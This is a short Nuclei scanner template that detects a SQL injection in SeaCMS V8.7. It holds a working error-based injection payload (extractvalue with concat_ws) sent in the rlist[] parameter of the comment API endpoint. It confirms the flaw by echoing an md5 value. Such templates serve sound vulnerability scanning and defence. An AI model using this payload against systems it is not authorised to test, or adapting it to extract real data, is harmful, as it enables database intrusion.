id: seacms-sqli
info:
  author: ritikchaddha
  name: SeaCMS V8.7 SQL Injection
  reference:
  - https://www.uedbox.com/post/54561/
  severity: high
  tags: seacms,sqli
requests:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5({{num}})}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`'
  redirects: true
variables:
  num: '999999999'
